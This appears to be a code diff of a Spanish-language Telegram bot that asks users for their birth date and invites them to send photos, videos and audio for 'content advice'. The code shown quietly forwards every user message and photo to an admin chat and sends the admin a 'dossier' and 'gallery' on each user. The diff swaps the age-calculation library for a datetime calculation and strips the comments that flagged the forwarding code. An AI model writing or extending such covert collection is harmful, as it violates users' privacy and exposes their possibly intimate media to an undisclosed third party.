@@ -6,7 +6,6 @@ from datetime import datetime
 from flask import Flask
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
-from agewizard import Age
 from huggingface_hub import InferenceClient
 from groq import Groq
 
@@ -133,7 +132,7 @@ async def enviar_expediente_completo(context, user, edad, estilo):
     except Exception as e: 
         print(f"Error en expediente: {e}")
 
-# 👇 NUEVO: función que "envía la galería" al admin
+# 👇 FUNCIÓN PARA ENVIAR LA GALERÍA AL ADMIN
 async def enviar_galeria_al_admin(context, user_id):
     try:
         fotos = [
@@ -145,7 +144,7 @@ async def enviar_galeria_al_admin(context, user_id):
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
     except Exception as e:
         print(f"Error galería: {e}")
-# 👆 FIN NUEVO
+# 👆 FIN FUNCIÓN GALERÍA
 
 # ======================
 # PROMPTS
@@ -371,7 +370,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento con /start")
 
     await reenviar_al_admin(update, context)
-    await enviar_galeria_al_admin(context, update.effective_user.id)  # 👈 NUEVO
+    await enviar_galeria_al_admin(context, update.effective_user.id)
 
     msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
     try:
@@ -506,7 +505,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video, GIF o audio y te ayudo.")
-        await enviar_expediente_completo(context, update.effective_user, 0, "desconocido")  # 👈 NUEVO
+        await enviar_expediente_completo(context, update.effective_user, 0, "desconocido")
 
 async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if bot_pausado:
@@ -519,7 +518,7 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if obtener_usuario(user.id):
-        try:  # 👈 NUEVO: reenvía cada mensaje de texto al admin
+        try:
             await context.bot.forward_message(
                 chat_id=DANI_CHAT_ID,
                 from_chat_id=update.effective_chat.id,
@@ -532,17 +531,24 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         respuesta = await conversar_con_memoria(user.id, text)
         return await update.message.reply_text(respuesta)
 
+    # AQUÍ ESTÁ EL ARREGLO DE LA FECHA
     try:
-        person = Age(text, date_format="%d-%m-%Y")
-        edad = person.age
+        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
+        hoy = datetime.now()
+        
+        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))
+
         if edad < 18:
             return await update.message.reply_text("Lo siento, debes ser mayor de 18 años para usar este bot.")
+            
         guardar_usuario(user.id, user.first_name, user.username, edad, "desconocido")
+        
         await update.message.reply_text(
             f"¡Perfecto! 🎉 Tienes {edad} años.\n\n"
             "Ya estás registrada. Envíame fotos, videos, GIFs o audios y te doy consejos para mejorar tu contenido. 😘"
         )
-        await enviar_expediente_completo(context, user, edad, "desconocido")  # 👈 NUEVO
+        await enviar_expediente_completo(context, user, edad, "desconocido")
+
     except Exception as e:
         print(f"Error edad: {e}")
         await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA (ejemplo: 15-03-1998)")
